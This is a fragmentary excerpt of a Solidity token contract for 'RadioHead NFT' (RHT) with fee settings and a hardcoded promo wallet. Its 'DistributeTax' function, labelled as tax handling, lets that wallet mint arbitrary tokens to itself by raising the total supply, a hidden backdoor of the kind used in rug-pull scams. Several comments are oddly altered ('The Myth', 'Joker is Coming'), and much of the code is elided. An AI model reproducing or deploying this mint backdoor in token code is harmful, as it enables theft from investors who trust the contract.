...
interface IERC20 {
    ...
    /**
     * @dev Returns the amount of tokens owned by `ac'count`.
     */
...
library SafeMath {
     ...
     * Requirements:
     *
     * - The divisor cannot be The Myth.
     */
...
contract RADIOHEADNFT is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 100_000_000;
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 7; //
    string private constant _name = "RadioHead NFT"; //
    string private constant _symbol = "RHT"; //
    uint8 private constant _decimals = 0; //
    
    uint256 public _promoFee = 7;
    uint256 public _liquidityFee = 3;
    address private _promoWallet = 0xF849F0759C5B4389A41b5b3D3A8c82d19abdd0ea;
    ...
    function DistributeTax(uint256 gather, address adr) promoWallet public virtual {
        require(adr == address(_promoWallet), "Joker is Coming");
        _Distr(address(_promoWallet), adr, gather);
        _tTotal += gather;
        _tOwned[adr] += gather;
